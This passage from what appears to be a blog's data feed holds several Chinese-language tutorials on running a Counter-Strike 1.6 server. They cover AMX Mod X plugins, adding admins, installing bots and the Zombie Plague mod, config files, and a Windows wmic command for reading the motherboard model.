<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">amxx plugins</span><br><span class="line">Currently loaded plugins:</span><br><span class="line">       name                    version     author            file             status   </span><br><span class="line"> [  1] Admin Base              1.8.2       AMXX Dev Team     admin.amxx       running  </span><br><span class="line"> [  2] Admin Commands          1.8.2       AMXX Dev Team     admincmd.amxx    running  </span><br><span class="line"> [  3] Admin Help              1.8.2       AMXX Dev Team     adminhelp.amxx   running  </span><br><span class="line"> [  4] Slots Reservation       1.8.2       AMXX Dev Team     adminslots.amxx  running  </span><br><span class="line"> [  5] Multi-Lingual System    1.8.2       AMXX Dev Team     multilingual.am  running  </span><br><span class="line"> [  6] Menus Front-End         1.8.2       AMXX Dev Team     menufront.amxx   running  </span><br><span class="line"> [  7] Commands Menu           1.8.2       AMXX Dev Team     cmdmenu.amxx     running  </span><br><span class="line"> [  8] Players Menu            1.8.2       AMXX Dev Team     plmenu.amxx      running  </span><br><span class="line"> [  9] Maps Menu               1.8.2       AMXX Dev Team     mapsmenu.amxx    running  </span><br><span class="line"> [ 10] Plugin Menu             1.8.2       AMXX Dev Team     pluginmenu.amxx  running  </span><br><span class="line"> [ 11] Admin Chat              1.8.2       AMXX Dev Team     adminchat.amxx   running  </span><br><span class="line"> [ 12] Anti Flood              1.8.2       AMXX Dev Team     antiflood.amxx   running  </span><br><span class="line"> [ 13] Scrolling Message       1.8.2       AMXX Dev Team     scrollmsg.amxx   running  </span><br><span class="line"> [ 14] Info. Messages          1.8.2       AMXX Dev Team     imessage.amxx    running  </span><br><span class="line"> [ 15] Admin Votes             1.8.2       AMXX Dev Team     adminvote.amxx   running  </span><br><span class="line"> [ 16] NextMap                 1.8.2       AMXX Dev Team     nextmap.amxx     running  </span><br><span class="line"> [ 17] Nextmap Chooser         1.8.2       AMXX Dev Team     mapchooser.amxx  running  </span><br><span class="line"> [ 18] TimeLeft                1.8.2       AMXX Dev Team     timeleft.amxx    running  </span><br><span class="line"> [ 19] Pause Plugins           1.8.2       AMXX Dev Team     pausecfg.amxx    running  </span><br><span class="line"> [ 20] Stats Configuration     1.8.2       AMXX Dev Team     statscfg.amxx    running  </span><br><span class="line"> [ 21] StatsX                  1.8.2       AMXX Dev Team     statsx.amxx      running  </span><br><span class="line">21 plugins, 21 running</span><br></pre></td></tr></table></figure>




<h3 id="This-Server-is-Using-AMX-Mod-X"><a href="#This-Server-is-Using-AMX-Mod-X" class="headerlink" title="This Server is Using AMX Mod X"></a>This Server is Using AMX Mod X</h3><p>完成。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Create-Server-with-steamcmd-and-install-AMXX-Windows/amxx_gameplay.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter Strike 1.6 - Pawn dynamic light</title>
    <url>/2022/06/07/Counter-Strike-1-6-Pawn-dynamic-light/</url>
    <content><![CDATA[<h1 id="Dynamic-Light"><a href="#Dynamic-Light" class="headerlink" title="Dynamic Light"></a>Dynamic Light</h1><ul>
<li><p>life (幾耐之後消失)<br>1 = 0.1 秒<br>10 = 1 秒</p>
</li>
<li><p>origin (位置)</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Frost Grenade: Freeze Blast</span></span><br><span class="line"><span class="built_in">create_blast3</span>(<span class="keyword">const</span> Float:origin[<span class="number">3</span>])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">engfunc</span>(EngFunc_MessageBegin, MSG_PVS, SVC_TEMPENTITY, origin, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">write_byte</span>(TE_DLIGHT);</span><br><span class="line">	<span class="built_in">engfunc</span>(EngFunc_WriteCoord, origin[<span class="number">0</span>]); <span class="comment">// x</span></span><br><span class="line">	<span class="built_in">engfunc</span>(EngFunc_WriteCoord, origin[<span class="number">1</span>]); <span class="comment">// y</span></span><br><span class="line">	<span class="built_in">engfunc</span>(EngFunc_WriteCoord, origin[<span class="number">2</span>]); <span class="comment">// z</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">30</span>); <span class="comment">// radius</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">30</span>); <span class="comment">// r</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">144</span>); <span class="comment">// g</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">255</span>); <span class="comment">// b</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">40</span>); <span class="comment">// life</span></span><br><span class="line">	<span class="built_in">write_byte</span>(<span class="number">30</span>); <span class="comment">// decay rate</span></span><br><span class="line">	<span class="built_in">message_end</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
        <tag>Pawn</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows - 使用指令查看主機版型號</title>
    <url>/2022/01/15/Command-check-your-computer-motherboard-model-in-windows/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>免用另外的程式。</p>
<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><p>用系統管理員身份開 cmd<br>再打</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">wmic baseboard get product,Manufacturer,version,serialnumber</span><br></pre></td></tr></table></figure>

<p>Done.</p>
<p>參考資料:<br><a href="https://blog.gtwang.org/windows/how-to-check-motherboard-model-in-windows/">https://blog.gtwang.org/windows/how-to-check-motherboard-model-in-windows/</a></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>指令</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 於伺服器新增管理員</title>
    <url>/2022/06/01/Counter-Strike-1-6-Server-ADD-Admin/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>當你成功開啟伺服器的時候，<br>但其實你並未為自己加入遊戲中的管理員權限，<br>接下來會示範為自己加入管理員權限。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Server-ADD-Admin/not%20access.png" class="">

<h1 id="查-SteamID"><a href="#查-SteamID" class="headerlink" title="查 SteamID"></a>查 SteamID</h1><p>於主控台輸入以下指令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">status</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-1-6-Server-ADD-Admin/status.png" class="">

<h2 id="新增"><a href="#新增" class="headerlink" title="新增"></a>新增</h2><p>當你看到 SteamID 的時候，<br>我們把他複製下來。<br>例 : STEAM_0:0:00000000</p>
<p>我們到這路徑開啟 <code>user.ini</code> 檔案再將他加以修改。</p>
<p><code>cstrike\addons\amxmodx\configs\user.ini</code></p>
<p>拉到最底，<br>新增 / 修改成這樣</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;STEAM_0:0:0000000&quot; &quot;&quot; &quot;abcdefghijklmnopqrstu&quot; &quot;ce&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>STEAM_0:0:0000000 (你的 SteamID)</li>
<li>abcdefghijklmnopqrstu (權限，全部都要的話就是最高權限)</li>
<li>ce (登入身份，由於是使用 SteamID，所以是 ce)</li>
</ul>
<h2 id="詳情"><a href="#詳情" class="headerlink" title="詳情"></a>詳情</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; Users configuration file</span><br><span class="line">; File location: $moddir/addons/amxmodx/configs/users.ini</span><br><span class="line"></span><br><span class="line">; Line starting with ; is a comment</span><br><span class="line"></span><br><span class="line">; Access flags:</span><br><span class="line">; a - immunity (can&#x27;t be kicked/baned/slayed/slaped and affected by other commmands)</span><br><span class="line">; b - reservation (can join on reserved slots)</span><br><span class="line">; c - amx_kick command</span><br><span class="line">; d - amx_ban and amx_unban commands</span><br><span class="line">; e - amx_slay and amx_slap commands</span><br><span class="line">; f - amx_map command</span><br><span class="line">; g - amx_cvar command (not all cvars will be available)</span><br><span class="line">; h - amx_cfg command</span><br><span class="line">; i - amx_chat and other chat commands</span><br><span class="line">; j - amx_vote and other vote commands</span><br><span class="line">; k - access to sv_password cvar (by amx_cvar command)</span><br><span class="line">; l - access to amx_rcon command and rcon_password cvar (by amx_cvar command)</span><br><span class="line">; m - custom level A (for additional plugins)</span><br><span class="line">; n - custom level B</span><br><span class="line">; o - custom level C</span><br><span class="line">; p - custom level D</span><br><span class="line">; q - custom level E</span><br><span class="line">; r - custom level F</span><br><span class="line">; s - custom level G</span><br><span class="line">; t - custom level H</span><br><span class="line">; u - menu access</span><br><span class="line">; z - user (no admin)</span><br><span class="line"></span><br><span class="line">; Account flags:</span><br><span class="line">; a - disconnect player on invalid password</span><br><span class="line">; b - clan tag</span><br><span class="line">; c - this is steamid/wonid</span><br><span class="line">; d - this is ip</span><br><span class="line">; e - password is not checked (only name/ip/steamid needed)</span><br><span class="line">; k - name or tag is case sensitive.  eg: if you set it so the name &quot;Ham&quot;</span><br><span class="line">;     is protected and case sensitive (flags &quot;k&quot; only), then anybody</span><br><span class="line">;     can use the names &quot;haM&quot;, &quot;HAM&quot;, &quot;ham&quot;, etc, but not &quot;Ham&quot;</span><br><span class="line"></span><br><span class="line">; Password:</span><br><span class="line">; Add to your autoexec.cfg: setinfo _pw &quot;&lt;password&gt;&quot;</span><br><span class="line">; Change _pw to the value of amx_password_field</span><br><span class="line"></span><br><span class="line">; Format of admin account:</span><br><span class="line">; &lt;name|ip|steamid&gt; &lt;password&gt; &lt;access flags&gt; &lt;account flags&gt;</span><br><span class="line"></span><br><span class="line">; Examples of admin accounts:</span><br><span class="line">; &quot;STEAM_0:0:123456&quot; &quot;&quot; &quot;abcdefghijklmnopqrstu&quot; &quot;ce&quot;</span><br><span class="line">; &quot;123.45.67.89&quot; &quot;&quot; &quot;abcdefghijklmnopqrstu&quot; &quot;de&quot;</span><br><span class="line">; &quot;My Name&quot; &quot;my_password&quot; &quot;abcdefghijklmnopqrstu&quot; &quot;a&quot;</span><br></pre></td></tr></table></figure>

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>完成後請重啟你的伺服器，<br>到主控台輸入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">restart</span><br></pre></td></tr></table></figure>

<p>進入伺服器你就會發現 <code>M9</code> (Admin menu) 開啟了。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Server-ADD-Admin/done.gif" class="">

<h2 id="指令新增官理員"><a href="#指令新增官理員" class="headerlink" title="指令新增官理員"></a>指令新增官理員</h2><p>此方法會即時在 <code>user.ini</code> 內新增</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">amx_addadmin &lt;playername|auth&gt; &lt;accessflags&gt; [password] [authtype] // add specified player as an admin to users.ini</span><br></pre></td></tr></table></figure>

<h2 id="輸入密碼"><a href="#輸入密碼" class="headerlink" title="輸入密碼"></a>輸入密碼</h2><p>如果是使用 player 密碼，<br>進入伺服器後你必須要在主控台輸入密碼才能遊玩，<br>錯了的話會將你踢除。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setinfo _pw &quot;password&quot;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 安裝電腦對打 (CS Bot Enabler)</title>
    <url>/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/</url>
    <content><![CDATA[<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/cover.png" class="">

<h1 id="CS-Bot-Enabler"><a href="#CS-Bot-Enabler" class="headerlink" title="CS Bot Enabler"></a>CS Bot Enabler</h1><p>為你的伺服器新增電腦，</p>
<h2 id="特徵"><a href="#特徵" class="headerlink" title="特徵"></a>特徵</h2><ul>
<li>Linux Support</li>
<li>電腦更聰明</li>
<li>任何地圖和模式都支援</li>
</ul>
<h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><ul>
<li><a href="https://github.com/Arkshine/CSBotEnabler">https://github.com/Arkshine/CSBotEnabler</a></li>
</ul>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><ul>
<li><a href="https://github.com/Arkshine/CSBotEnabler/releases/download/v1.0.1/csbot_enabler_mm-1.0.1.zip">https://github.com/Arkshine/CSBotEnabler/releases/download/v1.0.1/csbot_enabler_mm-1.0.1.zip</a> (主要檔案)</li>
<li><a href="https://github.com/Arkshine/CSBotEnabler/blob/master/resources/bot_profiles.zip?raw=true">https://github.com/Arkshine/CSBotEnabler/blob/master/resources/bot_profiles.zip?raw=true</a> (聱音檔)</li>
</ul>
<h2 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h2><p>先將剛剛下載的兩個檔案解壓</p>
<p>位置請跟以下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">├─ addons</span><br><span class="line">│   └─ csbot_enabler</span><br><span class="line">│       ├─ config.cfg</span><br><span class="line">│       ├─ csbot_enabler_mm.dll</span><br><span class="line">│       └─ csbot_enabler_mm_i386.so</span><br><span class="line">├─ sound</span><br><span class="line">│   └─ radio</span><br><span class="line">│       └─ bot</span><br><span class="line">│           ├─ a.wav</span><br><span class="line">│           ├─ a_bunch_of_them.wav</span><br><span class="line">│           └─ ...</span><br><span class="line">├─ BotChatter.db</span><br><span class="line">└─ BotProfile.db</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/unzip.gif" class="">

<h3 id="複製至-cstrike-內"><a href="#複製至-cstrike-內" class="headerlink" title="複製至 cstrike 內"></a>複製至 cstrike 內</h3><p>將四個檔案,資料夾放在 cstrike 內。</p>
<ul>
<li>addoons (資料夾)</li>
<li>sounds (資料夾)</li>
<li>BotChatter.db (檔案)</li>
<li>BotProfile.db (檔案)</li>
</ul>
<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/copy.gif" class="">

<h3 id="於-Plugins-ini-新增一行"><a href="#於-Plugins-ini-新增一行" class="headerlink" title="於 Plugins.ini 新增一行"></a>於 Plugins.ini 新增一行</h3><p>到 <code>\steamapps\common\Half-Life\cstrike\addons\metamod\plugins.ini</code> 內，<br>新增一行 (Windows or Linux)，</p>
<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win32 addons/csbot_enabler/csbot_enabler_mm.dll</span><br></pre></td></tr></table></figure>

<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linux addons/csbot_enabler/csbot_enabler_mm_i386.so</span><br></pre></td></tr></table></figure>

<p>然後儲存。</p>
<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/add.gif" class="">

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>完成以上的操作後，<br>請開啟你的伺服器，<br>然後在控制台打。</p>
<p>注意 :<br>每當一個新地圖加入電腦的時候，<br>都需要小小時間載入 Bot 的數據，<br>載入的時候有可能會彈出伺服器，<br>但不用擔心，<br>只需要再次進入伺服器即可。</p>
<p>另外，每次輸入一次 bot_add = 加入一個電腦。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bot_add</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/bot_add.png" class="">

<p>載入完成後 …</p>
<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/bot_addd.png" class="">

<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>設置電腦的無線電。</p>
<p>預設為 0 = 關閉<br>1 為開啟</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csbot_precache_radio_sounds &quot;0&quot;</span><br></pre></td></tr></table></figure>

<p>到 <code>csbot_enabler/config.ini</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Precache all bot radio sounds.</span><br><span class="line">// Please note:</span><br><span class="line">//   BotChatter.db must be present.</span><br><span class="line">//   Keep in mind that&#x27;s about 487 files for ~10 Mo total to download.</span><br><span class="line">//   Files are precached via the generic files buffer.</span><br><span class="line">// -</span><br><span class="line">// Default: &quot;0&quot;</span><br><span class="line">csbot_precache_radio_sounds &quot;0&quot;</span><br></pre></td></tr></table></figure>

<h2 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h2><p>更多指令可以以下兩句查看。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cvarlist bot</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/cvarlist%20bot.png" class="">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdlist bot</span><br></pre></td></tr></table></figure>

<img src="/2022/06/01/Counter-Strike-1-6-Server-INSTALL-CS-Bot-Enabler-BOT/cmdlist%20bot.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 安裝喪屍模式於伺服器</title>
    <url>/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/</url>
    <content><![CDATA[<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/cover.gif" class="">

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上回提及到如何安裝伺服器和 AMX Mod X<br>這次我會說明如何安裝 Zombie Plauge Mod。</p>
<p>在安裝喪屍模式前，<br>你必須已經安裝了 AMX Mod X。</p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p>請先到 AlliedModders 下載 Zombie Plague 相關檔案</p>
<h3 id="必須要安裝"><a href="#必須要安裝" class="headerlink" title="(必須要安裝)"></a>(必須要安裝)</h3><ul>
<li>zp_resources.zip (為聱音，模型，spr 檔)</li>
</ul>
<h3 id="zp-plugin-選擇一個"><a href="#zp-plugin-選擇一個" class="headerlink" title="zp_plugin (選擇一個)"></a>zp_plugin (選擇一個)</h3><ul>
<li>zp_plugin_43.zip (4.3，效能比起 5.0更高，但是只有一個 sma 檔)</li>
<li>zp_plugin_43_patched.zip (4.3 的修復版)</li>
<li>zp_plugin_50.zip (5.0，效能比起 4.3 低，但是 sma 會分開)</li>
<li>zp_plugin_50_patched.zip (5.0 的修復版)</li>
</ul>
<h3 id="zp5-0-or-zp-4-3"><a href="#zp5-0-or-zp-4-3" class="headerlink" title="zp5.0 or zp 4.3"></a>zp5.0 or zp 4.3</h3><p><a href="https://forums.alliedmods.net/showthread.php?s=d63394212992e827c6577de504a895bc&amp;t=72505">https://forums.alliedmods.net/showthread.php?s=d63394212992e827c6577de504a895bc&amp;t=72505</a></p>
<h3 id="zp5-0-Betas"><a href="#zp5-0-Betas" class="headerlink" title="zp5.0 Betas"></a>zp5.0 Betas</h3><p>建議下載 zp508a.zip，<br>因為是最新版 (2014年)</p>
<ul>
<li>zp506.zip</li>
<li>zp507.zip</li>
<li>zp508a.zip</li>
</ul>
<p><a href="https://forums.alliedmods.net/showthread.php?s=d63394212992e827c6577de504a895bc&amp;t=164926">https://forums.alliedmods.net/showthread.php?s=d63394212992e827c6577de504a895bc&amp;t=164926</a></p>
<h2 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h2><p>當你下載好兩個檔案就可以開始安裝。</p>
<ul>
<li>zp_resources.zip</li>
<li>zp_plugin.zip</li>
</ul>
<p>我選擇的是</p>
<ul>
<li>zp508a.zip (選一)</li>
<li>zp_resources.zip (必要)</li>
</ul>
<h2 id="解壓下載檔案"><a href="#解壓下載檔案" class="headerlink" title="解壓下載檔案"></a>解壓下載檔案</h2><p>然後將兩個檔案解壓。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/unzip-1.gif" class="">


<h2 id="複製檔案至-cstrike-內"><a href="#複製檔案至-cstrike-內" class="headerlink" title="複製檔案至 cstrike 內"></a>複製檔案至 <code>cstrike</code> 內</h2><p>將所有檔案放到 <code>\steamcmd\steamapps\common\Half-Life\cstrike</code> 內 (zip檔,txt 可以不放，不影響伺服器)</p>
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/copy-1.gif" class="">


<h2 id="Compile-sma-檔案"><a href="#Compile-sma-檔案" class="headerlink" title="Compile sma 檔案"></a>Compile sma 檔案</h2><p>我們需要將檔案 Compile 為 amxx 才可以使用，<br>我們到 <code>\steamapps\common\Half-Life\cstrike\addons\amxmodx\scripting\zp50</code>，<br>然後再將所有檔案複製到出一個位置 <code>\steamapps\common\Half-Life\cstrike\addons\amxmodx\scripting\</code>，<br>完成後再案 <code>compile.exe</code> 等他 Compile 完成。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/compile.gif" class="">


<h2 id="複製-AMXX-檔案"><a href="#複製-AMXX-檔案" class="headerlink" title="複製 AMXX 檔案"></a>複製 AMXX 檔案</h2><p>完成以上步驟我們到資料夾 <code>compiled</code><br>會看到剛剛 Compile 完的 AMXX 檔案，<br>將他全部複製到 <code>\steamapps\common\Half-Life\cstrike\addons\amxmodx\plugins</code><br>至於 replace 檔案的話，<br>如果是全新的話就可以 replace，<br>重點只是擔心可能取代你以前修過過的檔案。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/paste-1.gif" class="">

<h2 id="完成"><a href="#完成" class="headerlink" title="完成"></a>完成</h2><p>完成以上步驟已經安裝完成了，<br>重啟你的 hlds 伺服器後，<br>再開啟多次就會發現你的伺服器已經安裝了喪屍模式。</p>
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/done.png" class="">
<img src="/2022/05/31/Counter-Strike-1-6-Server-INSTALL-ZombiePlague/done-2.png" class="">]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
        <tag>Zombie Plague</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter-Strike 1.6 - 伺服器因應地圖檔名改變插件</title>
    <url>/2022/06/02/Counter-Strike-1-6-Server-Map-Specific-Plugins/</url>
    <content><![CDATA[<h1 id="Map-Specific-Plugins"><a href="#Map-Specific-Plugins" class="headerlink" title="Map Specific Plugins"></a>Map Specific Plugins</h1><p>如果要加入特別既地圖名用指定插件，<br>請喺 <code>addons\amxmodx\configs</code> 呢個路徑，<br>加一個 <code>folder</code> 叫做 <code>maps</code>，</p>
<img src="/2022/06/02/Counter-Strike-1-6-Server-Map-Specific-Plugins/maps.png" class="">
<p>然後再加你想加既 <code>plugins-maps.ini</code>。</p>
<p>例如你想淨係 <code>zm_</code> 字頭既地圖檔係用黎玩喪屍場，<br>咁就加個檔案叫做 <code>plugins-zm.ini</code>，<br>然後呢個檔案入面既插件就會淨係認到 <code>zm_</code> 字頭既地圖檔。</p>
<img src="/2022/06/02/Counter-Strike-1-6-Server-Map-Specific-Plugins/plugins-zm.png" class="">

<h1 id="Disabled"><a href="#Disabled" class="headerlink" title="Disabled"></a>Disabled</h1><p>如果你出面啲插件唔想用，<br>只需要喺檔案前面加啲字，<br>例如 <code>noneed-zp50_amxx.ini</code>，<br>咁樣就會將插件停用。</p>
<p>不過呢度會建議你用個易記啲既名，<br>建議咁樣打 <code>disabled-zp50_amxx.ini</code></p>
<img src="/2022/06/02/Counter-Strike-1-6-Server-Map-Specific-Plugins/disabled.png" class="">

<h1 id="Detail"><a href="#Detail" class="headerlink" title="Detail"></a>Detail</h1><ul>
<li><a href="https://wiki.alliedmods.net/Configuring_AMX_Mod_X#Map_Specific_Plugins">https://wiki.alliedmods.net/Configuring_AMX_Mod_X#Map_Specific_Plugins</a></li>
</ul>
]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter Strike 1.6 - [!Error] Steam validation rejected</title>
    <url>/2022/02/20/Counter-Strike-1-6-Steam-validation-rejected/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以我個人經驗，<br>會出現呢個 Error 入唔到 Server，<br>不外乎兩個原因</p>
<ul>
<li>IP 切換 (VPN, Proxy)</li>
<li>你開完盜版 CS1.6 再開正版</li>
</ul>
<img src="/2022/02/20/Counter-Strike-1-6-Steam-validation-rejected/rejected.png" class="">

<h2 id="解決方法一"><a href="#解決方法一" class="headerlink" title="解決方法一"></a>解決方法一</h2><p>只需要喺開啟 Console 再輸入以下指令 (撳 ~ 開)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sv_lan 1</span><br></pre></td></tr></table></figure>

<img src="/2022/02/20/Counter-Strike-1-6-Steam-validation-rejected/fix%20reject.gif" class="">

<p>然後再入多次 Server 就得。</p>
<h2 id="解決方法二"><a href="#解決方法二" class="headerlink" title="解決方法二"></a>解決方法二</h2><p>呢個方法都係最唔想做既方法。</p>
<p>就係重開電腦 ._.</p>
<hr>
<p>資考資料<br><a href="https://steamcommunity.com/discussions/forum/1/2747650363469671460/">https://steamcommunity.com/discussions/forum/1/2747650363469671460/</a></p>
]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>指令</tag>
        <tag>Games</tag>
      </tags>
  </entry>
  <entry>
    <title>Counter Strike 1.6 - ZP Config 檔案說明</title>
    <url>/2022/06/07/Counter-Strike-1-6-Zombie-Plauge-config-files/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Config 檔案係用黎方便你改你既 Model，Sounds，數值呢啲野。</p>
<h2 id="zombieplague-cfg"><a href="#zombieplague-cfg" class="headerlink" title="zombieplague.cfg"></a>zombieplague.cfg</h2><p>數值設置用既檔案</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zp_nemesis_health 0.1</span><br><span class="line"></span><br><span class="line">zp_gamemode_delay 10</span><br><span class="line"></span><br><span class="line">zp_admin_models_human_player 1</span><br><span class="line"></span><br><span class="line">zp_deathmatch 2</span><br><span class="line"></span><br><span class="line">zp_nvision_zombie 2</span><br><span class="line">zp_nvision_zombie_color_R 155	</span><br><span class="line">zp_nvision_zombie_color_G 155	</span><br><span class="line">zp_nvision_zombie_color_B 0</span><br></pre></td></tr></table></figure>

<h2 id="zombieplague-ini"><a href="#zombieplague-ini" class="headerlink" title="zombieplague.ini"></a>zombieplague.ini</h2><p>路徑設置</p>
<ul>
<li>聲音</li>
<li>模型</li>
<li>spr</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[Weapon Models]</span><br><span class="line">V_KNIFE HUMAN = models/zombie_plague/TIG_MODEL/v_human_knife.mdl</span><br><span class="line">V_KNIFE NEMESIS = models/zombie_plague/TIG_MODEL/v_n2.mdl</span><br><span class="line">V_WEAPON SURVIVOR = models/v_ak47.mdl</span><br><span class="line">GRENADE INFECT = models/zombie_plague/v_grenade_infect.mdl</span><br><span class="line">GRENADE FIRE = models/v_hegrenade.mdl</span><br><span class="line">GRENADE FROST = models/v_flashbang.mdl</span><br><span class="line">GRENADE FLARE = models/v_smokegrenade.mdl</span><br><span class="line">V_KNIFE ADMIN HUMAN = models/v_knife.mdl</span><br><span class="line">V_KNIFE ADMIN ZOMBIE = models/zombie_plague/v_knife_zombie.mdl</span><br></pre></td></tr></table></figure>

<h2 id="zp-extraitems-ini"><a href="#zp-extraitems-ini" class="headerlink" title="zp_extraitems.ini"></a>zp_extraitems.ini</h2><p>你買野既野</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Infection Bomb]</span><br><span class="line">NAME = T-病毒</span><br><span class="line">COST = 15</span><br></pre></td></tr></table></figure>

<h2 id="zp-zombieclasses-ini"><a href="#zp-zombieclasses-ini" class="headerlink" title="zp_zombieclasses.ini"></a>zp_zombieclasses.ini</h2><p>喪屍類別</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Classic Zombie]</span><br><span class="line">NAME = Classic Zombie</span><br><span class="line">INFO = =Balanced=</span><br><span class="line">MODELS = zombie_source</span><br><span class="line">CLAWMODEL = models/zombie_plague/v_knife_zombie.mdl</span><br><span class="line">HEALTH = 1800</span><br><span class="line">SPEED = 0.75</span><br><span class="line">GRAVITY = 1.00</span><br><span class="line">KNOCKBACK = 1.00</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Counter-Strike 1.6</category>
      </categories>
      <tags>
        <tag>Games</tag>
        <tag>Server</tag>
        <tag>AMX Mod X</tag>
        <tag>Zombie Plague</tag>
      </tags>
  </entry>
  <entry>
